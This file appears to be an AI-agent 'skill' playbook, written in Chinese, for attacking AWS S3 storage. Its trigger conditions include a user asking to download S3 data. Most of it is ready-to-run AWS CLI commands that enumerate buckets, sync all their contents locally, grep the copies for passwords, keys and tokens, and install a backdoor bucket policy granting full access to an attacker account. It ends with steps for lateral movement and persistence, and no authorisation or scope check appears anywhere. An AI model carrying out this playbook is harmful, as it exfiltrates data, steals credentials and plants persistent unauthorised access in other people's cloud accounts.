---
name: aws-s3-attack
type: attack
category: storage-exfiltration
platform: aws
severity: high
---

# AWS S3 存储攻击技能

## 触发条件

- 有 AWS 凭证且发现 S3 访问权限
- 用户要求"测试 S3 安全"
- 用户要求"下载 S3 数据"
- 发现 S3 存储桶 URL

## 前置检查

```bash
# 1. 检查 S3 列举权限
aws s3 ls
# 如果返回存储桶列表，有权限

# 2. 检查具体存储桶权限
aws s3 ls s3://target-bucket
# 如果返回对象列表，有权限

# 3. 检查存储桶 ACL
aws s3api get-bucket-acl --bucket target-bucket
```

## 攻击方法

### 方法 1: 枚举所有存储桶

```bash
# 列出所有可访问的存储桶
aws s3 ls

# 对每个存储桶检查权限
for bucket in $(aws s3 ls | awk '{print $NF}' | sed 's/\///'); do
    echo "检查存储桶: $bucket"
    aws s3 ls s3://$bucket --recursive 2>/dev/null | head -20
done
```

### 方法 2: 下载敏感数据

```bash
# 1. 列出存储桶内容
aws s3 ls s3://target-bucket --recursive

# 2. 下载所有文件
aws s3 sync s3://target-bucket ./downloaded

# 3. 搜索敏感文件
find ./downloaded -type f \( -name "*.env" -o -name "*.pem" -o -name "*.key" -o -name "*.sql" -o -name "credentials" \)

# 4. 搜索文件内容
grep -r "password\|secret\|key\|token" ./downloaded --include="*.txt" --include="*.env" --include="*.json" | head -50
```

### 方法 3: 后门植入

```bash
# 1. 创建后门策略
cat > backdoor-policy.json <<EOF
{
    "Version": "2012-10-17",
    "Statement": [{
        "Effect": "Allow",
        "Principal": {"AWS": "arn:aws:iam::ATTACKER_ACCOUNT:root"},
        "Action": "s3:*",
        "Resource": ["arn:aws:s3:::target-bucket", "arn:aws:s3:::target-bucket/*"]
    }]
}
EOF

# 2. 应用后门策略（如果有权限）
aws s3api put-bucket-policy --bucket target-bucket --policy file://backdoor-policy.json

# 3. 从攻击者账户验证
aws s3 ls s3://target-bucket --profile attacker
```

### 方法 4: 未授权访问测试

```bash
# 不使用凭证测试
aws s3 ls s3://target-bucket --no-sign-request

# 或使用 curl
curl -I https://target-bucket.s3.amazonaws.com/
curl https://target-bucket.s3.amazonaws.com/

# 测试目录列表
curl https://target-bucket.s3.amazonaws.com/?list-type=2
```

## 验证成功

```bash
# 成功下载文件
ls -lh ./downloaded/

# 找到敏感数据
grep -l "password" ./downloaded/*.env 2>/dev/null

# 后门植入成功
aws s3api get-bucket-policy --bucket target-bucket | grep ATTACKER_ACCOUNT
```

## 攻击后操作

```bash
# 1. 分析下载的数据
# 2. 提取凭证和密钥
# 3. 使用提取的凭证进行横向移动
# 4. 建立持久化
```

## 输出报告

```markdown
# S3 攻击报告
- 枚举存储桶: X 个
- 可访问存储桶: Y 个
- 下载数据: Z GB
- 发现敏感文件: [列表]
```

## 下一步

1. aws-enum - 继续枚举其他资源
2. aws-persistence - 建立持久化
3. aws-lambda-attack - 攻击 Lambda 函数
